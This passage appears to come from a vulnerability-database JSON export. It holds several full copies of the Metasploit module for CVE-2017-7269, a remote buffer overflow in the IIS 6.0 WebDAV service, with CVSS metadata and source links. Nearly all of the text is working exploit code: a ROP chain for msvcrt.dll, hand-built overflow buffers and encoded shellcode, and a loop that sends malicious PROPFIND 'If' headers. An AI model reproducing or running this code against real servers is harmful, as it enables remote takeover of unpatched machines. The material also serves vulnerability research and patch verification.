'DisableNops'    =>  'True',\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ESI',\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'       => 'process',\n          'PrependMigrate' => true,\n        },\n      'Targets'        =>\n        [\n          [\n            'Microsoft Windows Server 2003 R2 SP2 x86',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_X86\n            },\n          ],\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => 'Mar 26 2017',\n      'DefaultTarget'  => 0,\n      'Notes' =>\n          {\n              'AKA' => ['EXPLODINGCAN']\n          }\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',  [ true, 'Path of IIS 6 web application', '/']),\n        OptInt.new('MINPATHLENGTH', [ true, 'Start of physical path brute force', 3 ]),\n        OptInt.new('MAXPATHLENGTH', [ true, 'End of physical path brute force', 60 ]),\n      ])\n  end\n\n  def min_path_len\n    datastore['MINPATHLENGTH']\n  end\n\n  def max_path_len\n    datastore['MAXPATHLENGTH']\n  end\n\n  def supports_webdav?(headers)\n    if headers['MS-Author-Via'] == 'DAV' ||\n       headers['DASL'] == '<DAV:sql>' ||\n       headers['DAV'] =~ /^[1-9]+(,\\s+[1-9]+)?$/ ||\n       headers['Public'].to_s.include?('PROPFIND') ||\n       headers['Allow'].to_s.include?('PROPFIND')\n      return true\n    end\n\n    false\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => target_uri.path,\n      'method' => 'OPTIONS'\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless supports_webdav? res.headers\n      vprint_status 'Server does not support WebDAV'\n      return CheckCode::Safe\n    end\n\n    if res.headers['Server'].to_s.include? 'IIS/6.0'\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Detected\n  end\n\n  # corelan.be\n  # rop chain generated with mona.py\n  def create_rop_chain\n    [\n      #MSVCRT.dll - all Windows 2003\n      0x77bcb06c, # POP ESI # RETN\n      0x77bef001, # Write pointer # Garbage\n      0x77bb2563, # POP EAX # RETN\n      0x77ba1114, # <- *&VirtualProtect()\n      0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n      0x41414141, # junk\n      0x77bbee22, # XCHG EAX,ESI # ADD BYTE PTR DS:[EAX],AL # RETN\n      0x77bc9801, # POP EBP # RETN\n      0x77be2265, # ptr to 'push esp #  ret'\n      0x77bb2563, # POP EAX # RETN\n      0x03C0946F,\n      0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)\n      0x77bb48d3, # POP EBX, RET\n      0x77bf21e0, # .data\n      0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n      0x77bbfc02, # POP ECX # RETN\n      0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n      0x77bd8c04, # POP EDI # RETN\n      0x77bd8c05, # ROP NOP (-> edi)\n      0x77bb2563, # POP EAX # RETN\n      0x03c0944f,\n      0x77bdd441, # SUB EAX, 03c0940f\n      0x77bb8285, # XCHG EAX,EDX # RETN\n      0x77bb2563, # POP EAX # RETN\n      0x90909090, # nop\n      0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n    ].pack(\"V*\")\n  end\n\n  #encode string as UTF-8 char format that when converted to UTF-16LE\n  #will represent chars we want in memory\n  def utf_encode_str(str)\n    str.force_encoding('UTF-16LE').encode('UTF-8')\n  end\n\n  #filler chars to be encoded\n  def make_junk(len)\n    utf_encode_str rand_text_alpha(len)\n  end\n\n  def exploit\n    # extract the local servername and port from a PROPFIND request\n    # these need to be the values from the backend server\n    # if testing a reverse proxy setup, these values differ\n    # from RHOST and RPORT but can be extracted this way\n    vprint_status('Extracting ServerName and Port')\n    res = send_request_raw(\n      'method' => 'PROPFIND',\n      'headers' => {\n        'Content-Length' => 0\n      },\n      'uri' => target_uri.path\n    )\n    fail_with(Failure::BadConfig, 'Server did not respond correctly to WebDAV request') if(res.nil? || res.code != 207)\n\n    xml = res.get_xml_document\n    url = URI.parse(xml.at(\"//a:response//a:href\").text)\n    server_name = url.hostname\n    server_port = url.port\n    server_scheme = url.scheme\n\n    http_host = \"#{server_scheme}://#{server_name}:#{server_port}\"\n    vprint_status(\"Using http_host #{http_host}\")\n\n    print_status \"Trying path length #{min_path_len} to #{max_path_len} ...\"\n\n    min_path_len.upto(max_path_len) do |path_len|\n      vprint_status(\"Trying path length of #{path_len}...\")\n\n      begin\n        buf1 = \"<#{http_host}/\"\n        buf1 << rand_text_alpha(114 - path_len)\n        buf1 << make_junk(32)\n        #survive SHR instruction 0x02020202\n        buf1 << utf_encode_str([0x02020202].pack('V'))\n        #str pointer to .data httpext.dll # ebp-328 # used in wcslen calculation\n        buf1 << utf_encode_str([0x680312c0].pack('V'))\n        buf1 << make_junk(40)\n        #0x680313c0 -> destination pointer used with memcpy\n        buf1 << utf_encode_str([0x680313c0].pack('V'))\n        buf1 << \">\"\n        buf1 << \" (Not <locktoken:write1>) <#{http_host}/\"\n        buf1 << rand_text_alpha(114 - path_len)\n        buf1 << make_junk(28)\n        #0x680313c0  -> pointer to call itself at same address for vtable call\n        buf1 << utf_encode_str([0x680313c0].pack('V'))\n        #ROP 2 gadget -> advance ESP past previous instructions to start of ROP chain\n        #msvct.dll 0x77bdf38d # ADD ESP,1C # POP ECX # POP EBX # POP EAX # RETN\n        buf1 << utf_encode_str([0x77bdf38d].pack('V'))\n        buf1 << make_junk(8)\n        #0x680313c0 -> vtable pointer passed to EAX for call [eax +24]\n        #point to itself at [eax]\n        buf1 << utf_encode_str([0x680313c0].pack('V'))\n        buf1 << make_junk(16)\n        #ROP 1 gadget -> 0x68016082 stack flip get ECX into ESP and push EAX\n        #which also points to new ESP\n        buf1 << utf_encode_str([0x68016082].pack('V'))\n        buf1 << utf_encode_str(create_rop_chain)\n        #GetPC # push esp; pop esi; add esi, 10\n        buf1 << utf_encode_str(\"\\x54\\x5e\\x83\\xc6\")\n        #GetPC ESI +10 plus encode alignment\n        buf1 << utf_encode_str(\"\\x0a\\x41\")\n        buf1 << payload.encoded\n        buf1 << \">\"\n\n        vprint_status 'Sending payload'\n        res = send_request_raw(\n          'method' => 'PROPFIND',\n          'uri' => target_uri.path,\n          'headers' => {\n            'Content-Length' => 0,\n            'If' => \"#{buf1}\"\n          }\n        )\n        next unless res\n\n        vprint_status(\"Server returned status #{res.code}\")\n        next if res.code == 502 || res.code == 400\n\n        return if session_created?\n\n        vprint_status(\"Unknown Response: #{res.code}\")\n      rescue ::Errno::ECONNRESET\n        vprint_status('got a connection reset')\n        next\n      end\n    end\n  end\nend\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/IIS/IIS_WEBDAV_SCSTORAGEPATHFROMURL"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016. Original exploit by Zhiniang Peng and Chen Wu.",
            "modified": "2017-05-11T00:00:00",
            "published": "2017-05-11T00:00:00",
            "href": "https://0day.today/exploit/description/27757",
            "id": "1337DAY-ID-27757",
            "title": "Microsoft IIS WebDav ScStoragePathFromUrl Overflow Exploit",
            "type": "zdt",
            "sourceData": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ManualRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => ' Microsoft IIS WebDav ScStoragePathFromUrl Overflow',\r\n      'Description'    => %q{\r\n          Buffer overflow in the ScStoragePathFromUrl function\r\n          in the WebDAV service in Internet Information Services (IIS) 6.0\r\n          in Microsoft Windows Server 2003 R2 allows remote attackers to\r\n          execute arbitrary code via a long header beginning with\r\n          \"If: <http://\" in a PROPFIND request, as exploited in the\r\n          wild in July or August 2016.\r\n\r\n          Original exploit by Zhiniang Peng and Chen Wu.\r\n      },\r\n      'Author'         =>\r\n        [\r\n        'Zhiniang Peng', # Original author\r\n        'Chen Wu',       # Original author\r\n        'Dominic Chell <[email\u00a0protected]>', # metasploit module\r\n        'firefart', # metasploit module\r\n        'zcgonvh <[email\u00a0protected]>', # metasploit module\r\n        'Rich Whitcroft' # metasploit module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2017-7269' ],\r\n          [ 'BID', '97127' ],\r\n          [ 'URL', 'https://github.com/edwardz246003/IIS_exploit' ],\r\n          [ 'URL', 'https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html' ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'Payload'        =>\r\n        {\r\n          'Space'         => 2000,\r\n          'BadChars'      => \"\\x00\",\r\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUnicodeMixed,\r\n          'DisableNops'   =>  'True',\r\n          'EncoderOptions' =>\r\n            {\r\n              'BufferRegister' => 'ESI',\r\n            }\r\n        },\r\n      'DefaultOptions' =>\r\n        {\r\n          'EXITFUNC' => 'process',\r\n          'PrependMigrate' => true,\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          [\r\n            'Microsoft Windows Server 2003 R2 SP2',\r\n            {\r\n              'Platform' => 'win',\r\n            },\r\n          ],\r\n        ],\r\n      'Platform'       => 'win',\r\n      'DisclosureDate' => 'Mar 26 2017',\r\n      'DefaultTarget' => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, 'Path of IIS 6 web application', '/']),\r\n        OptInt.new('MINPATHLENGTH', [ true, 'Start of physical path brute force', 3 ]),\r\n        OptInt.new('MAXPATHLENGTH', [ true, 'End of physical path brute force', 60 ]),\r\n      ])\r\n  end\r\n\r\n  def min_path_len\r\n    datastore['MINPATHLENGTH']\r\n  end\r\n\r\n  def max_path_len\r\n    datastore['MAXPATHLENGTH']\r\n  end\r\n\r\n  def supports_webdav?(headers)\r\n    if headers['MS-Author-Via'] == 'DAV' ||\r\n       headers['DASL'] == '<DAV:sql>' ||\r\n       headers['DAV'] =~ /^[1-9]+(,\\s+[1-9]+)?$/ ||\r\n       headers['Public'] =~ /PROPFIND/ ||\r\n       headers['Allow'] =~ /PROPFIND/\r\n      return true\r\n    else\r\n      return false\r\n    end\r\n  end\r\n\r\n  def check\r\n    res = send_request_cgi({\r\n      'uri' => target_uri.path,\r\n      'method' => 'OPTIONS'\r\n    })\r\n    if res && res.headers['Server'].include?('IIS/6.0') && supports_webdav?(res.headers)\r\n      return Exploit::CheckCode::Vulnerable\r\n    elsif res && supports_webdav?(res.headers)\r\n      return Exploit::CheckCode::Detected\r\n    elsif res.nil?\r\n      return Exploit::CheckCode::Unknown\r\n    else\r\n      return Exploit::CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # extract the local servername and port from a PROPFIND request\r\n    # these need to be the values from the backend server\r\n    # if testing a reverse proxy setup, these values differ\r\n    # from RHOST and RPORT but can be extracted this way\r\n    vprint_status(\"Extracting ServerName and Port\")\r\n    res = send_request_raw(\r\n      'method' => 'PROPFIND',\r\n      'headers' => {\r\n        'Content-Length' => 0\r\n      },\r\n      'uri' => target_uri.path\r\n    )\r\n    fail_with(Failure::BadConfig, \"Server did not respond correctly to WebDAV request\") if(res.nil? || res.code != 207)\r\n\r\n    xml = res.get_xml_document\r\n    url = URI.parse(xml.at(\"//a:response//a:href\").text)\r\n    server_name = url.hostname\r\n    server_port = url.port\r\n    server_scheme = url.scheme\r\n\r\n    http_host = \"#{server_scheme}://#{server_name}:#{server_port}\"\r\n    vprint_status(\"Using http_host #{http_host}\")\r\n\r\n    min_path_len.upto(max_path_len) do |path_len|\r\n      vprint_status(\"Trying path length of #{path_len}...\")\r\n\r\n      begin\r\n        buf1 = \"<#{http_host}/\"\r\n        buf1 << rand_text_alpha(114 - path_len)\r\n        buf1 << \"\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac\"\r\n        buf1 << \">\"\r\n        buf1 << \" (Not <locktoken:write1>) <#{http_host}/\"\r\n        buf1 << rand_text_alpha(114 - path_len)\r\n        buf1 << \"\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\"\r\n        buf1 << payload.encoded\r\n        buf1 << \">\"\r\n\r\n        vprint_status(\"Sending payload\")\r\n        res = send_request_raw(\r\n          'method' => 'PROPFIND',\r\n          'headers' => {\r\n            'Content-Length' => 0,\r\n            'If' => \"#{buf1}\"\r\n          },\r\n          'uri' => target_uri.path\r\n        )\r\n        if res\r\n          vprint_status(\"Server returned status #{res.code}\")\r\n          if res.code == 502 || res.code == 400\r\n            next\r\n          elsif session_created?\r\n            return\r\n          else\r\n            vprint_status(\"Unknown Response: #{res.code}\")\r\n          end\r\n        end\r\n      rescue ::Errno::ECONNRESET\r\n        vprint_status(\"got a connection reset\")\r\n        next\r\n      end\r\n    end\r\n  end\r\nend\n\n#  0day.today [2018-02-16]  #",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-27757"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS WebDav - ScStoragePathFromUrl Overflow (Metasploit). CVE-2017-7269. Remote exploit for Windows platform. Tags: Metasploit Framework",
            "modified": "2017-05-11T00:00:00",
            "published": "2017-05-11T00:00:00",
            "id": "EDB-ID:41992",
            "href": "https://www.exploit-db.com/exploits/41992/",
            "type": "exploitdb",
            "title": "Microsoft IIS WebDav - ScStoragePathFromUrl Overflow (Metasploit)",
            "sourceData": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ManualRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => ' Microsoft IIS WebDav ScStoragePathFromUrl Overflow',\r\n      'Description'    => %q{\r\n          Buffer overflow in the ScStoragePathFromUrl function\r\n          in the WebDAV service in Internet Information Services (IIS) 6.0\r\n          in Microsoft Windows Server 2003 R2 allows remote attackers to\r\n          execute arbitrary code via a long header beginning with\r\n          \"If: <http://\" in a PROPFIND request, as exploited in the\r\n          wild in July or August 2016.\r\n\r\n          Original exploit by Zhiniang Peng and Chen Wu.\r\n      },\r\n      'Author'         =>\r\n        [\r\n        'Zhiniang Peng', # Original author\r\n        'Chen Wu',       # Original author\r\n        'Dominic Chell <dominic@mdsec.co.uk>', # metasploit module\r\n        'firefart', # metasploit module\r\n        'zcgonvh <zcgonvh@qq.com>', # metasploit module\r\n        'Rich Whitcroft' # metasploit module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2017-7269' ],\r\n          [ 'BID', '97127' ],\r\n          [ 'URL', 'https://github.com/edwardz246003/IIS_exploit' ],\r\n          [ 'URL', 'https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html' ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'Payload'        =>\r\n        {\r\n          'Space'         => 2000,\r\n          'BadChars'      => \"\\x00\",\r\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUnicodeMixed,\r\n          'DisableNops'   =>  'True',\r\n          'EncoderOptions' =>\r\n            {\r\n              'BufferRegister' => 'ESI',\r\n            }\r\n        },\r\n      'DefaultOptions' =>\r\n        {\r\n          'EXITFUNC' => 'process',\r\n          'PrependMigrate' => true,\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          [\r\n            'Microsoft Windows Server 2003 R2 SP2',\r\n            {\r\n              'Platform' => 'win',\r\n            },\r\n          ],\r\n        ],\r\n      'Platform'       => 'win',\r\n      'DisclosureDate' => 'Mar 26 2017',\r\n      'DefaultTarget' => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, 'Path of IIS 6 web application', '/']),\r\n        OptInt.new('MINPATHLENGTH', [ true, 'Start of physical path brute force', 3 ]),\r\n        OptInt.new('MAXPATHLENGTH', [ true, 'End of physical path brute force', 60 ]),\r\n      ])\r\n  end\r\n\r\n  def min_path_len\r\n    datastore['MINPATHLENGTH']\r\n  end\r\n\r\n  def max_path_len\r\n    datastore['MAXPATHLENGTH']\r\n  end\r\n\r\n  def supports_webdav?(headers)\r\n    if headers['MS-Author-Via'] == 'DAV' ||\r\n       headers['DASL'] == '<DAV:sql>' ||\r\n       headers['DAV'] =~ /^[1-9]+(,\\s+[1-9]+)?$/ ||\r\n       headers['Public'] =~ /PROPFIND/ ||\r\n       headers['Allow'] =~ /PROPFIND/\r\n      return true\r\n    else\r\n      return false\r\n    end\r\n  end\r\n\r\n  def check\r\n    res = send_request_cgi({\r\n      'uri' => target_uri.path,\r\n      'method' => 'OPTIONS'\r\n    })\r\n    if res && res.headers['Server'].include?('IIS/6.0') && supports_webdav?(res.headers)\r\n      return Exploit::CheckCode::Vulnerable\r\n    elsif res && supports_webdav?(res.headers)\r\n      return Exploit::CheckCode::Detected\r\n    elsif res.nil?\r\n      return Exploit::CheckCode::Unknown\r\n    else\r\n      return Exploit::CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # extract the local servername and port from a PROPFIND request\r\n    # these need to be the values from the backend server\r\n    # if testing a reverse proxy setup, these values differ\r\n    # from RHOST and RPORT but can be extracted this way\r\n    vprint_status(\"Extracting ServerName and Port\")\r\n    res = send_request_raw(\r\n      'method' => 'PROPFIND',\r\n      'headers' => {\r\n        'Content-Length' => 0\r\n      },\r\n      'uri' => target_uri.path\r\n    )\r\n    fail_with(Failure::BadConfig, \"Server did not respond correctly to WebDAV request\") if(res.nil? || res.code != 207)\r\n\r\n    xml = res.get_xml_document\r\n    url = URI.parse(xml.at(\"//a:response//a:href\").text)\r\n    server_name = url.hostname\r\n    server_port = url.port\r\n    server_scheme = url.scheme\r\n\r\n    http_host = \"#{server_scheme}://#{server_name}:#{server_port}\"\r\n    vprint_status(\"Using http_host #{http_host}\")\r\n\r\n    min_path_len.upto(max_path_len) do |path_len|\r\n      vprint_status(\"Trying path length of #{path_len}...\")\r\n\r\n      begin\r\n        buf1 = \"<#{http_host}/\"\r\n        buf1 << rand_text_alpha(114 - path_len)\r\n        buf1 << \"\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac\"\r\n        buf1 << \">\"\r\n        buf1 << \" (Not <locktoken:write1>) <#{http_host}/\"\r\n        buf1 << rand_text_alpha(114 - path_len)\r\n        buf1 << \"\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\"\r\n        buf1 << payload.encoded\r\n        buf1 << \">\"\r\n\r\n        vprint_status(\"Sending payload\")\r\n        res = send_request_raw(\r\n          'method' => 'PROPFIND',\r\n          'headers' => {\r\n            'Content-Length' => 0,\r\n            'If' => \"#{buf1}\"\r\n          },\r\n          'uri' => target_uri.path\r\n        )\r\n        if res\r\n          vprint_status(\"Server returned status #{res.code}\")\r\n          if res.code == 502 || res.code == 400\r\n            next\r\n          elsif session_created?\r\n            return\r\n          else\r\n            vprint_status(\"Unknown Response: #{res.code}\")\r\n          end\r\n        end\r\n      rescue ::Errno::ECONNRESET\r\n        vprint_status(\"got a connection reset\")\r\n        next\r\n      end\r\n    end\r\n  end\r\nend\r\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:41992"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2017-05-11T00:00:00",
            "published": "2017-05-11T00:00:00",
            "href": "https://packetstormsecurity.com/files/142471/-Microsoft-IIS-WebDav-ScStoragePathFromUrl-Overflow.html",
            "id": "PACKETSTORM:142471",
            "title": " Microsoft IIS WebDav ScStoragePathFromUrl Overflow",
            "type": "packetstorm",
            "sourceData": "`##  \n# This module requires Metasploit: http://metasploit.com/download  \n# Current source: https://github.com/rapid7/metasploit-framework  \n##  \n  \nclass MetasploitModule < Msf::Exploit::Remote  \nRank = ManualRanking  \n  \ninclude Msf::Exploit::Remote::HttpClient  \n  \ndef initialize(info = {})  \nsuper(update_info(info,  \n'Name' => ' Microsoft IIS WebDav ScStoragePathFromUrl Overflow',  \n'Description' => %q{  \nBuffer overflow in the ScStoragePathFromUrl function  \nin the WebDAV service in Internet Information Services (IIS) 6.0  \nin Microsoft Windows Server 2003 R2 allows remote attackers to  \nexecute arbitrary code via a long header beginning with  \n\"If: <http://\" in a PROPFIND request, as exploited in the  \nwild in July or August 2016.  \n  \nOriginal exploit by Zhiniang Peng and Chen Wu.  \n},  \n'Author' =>  \n[  \n'Zhiniang Peng', # Original author  \n'Chen Wu', # Original author  \n'Dominic Chell <dominic@mdsec.co.uk>', # metasploit module  \n'firefart', # metasploit module  \n'zcgonvh <zcgonvh@qq.com>', # metasploit module  \n'Rich Whitcroft' # metasploit module  \n],  \n'License' => MSF_LICENSE,  \n'References' =>  \n[  \n[ 'CVE', '2017-7269' ],  \n[ 'BID', '97127' ],  \n[ 'URL', 'https://github.com/edwardz246003/IIS_exploit' ],  \n[ 'URL', 'https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html' ]  \n],  \n'Privileged' => false,  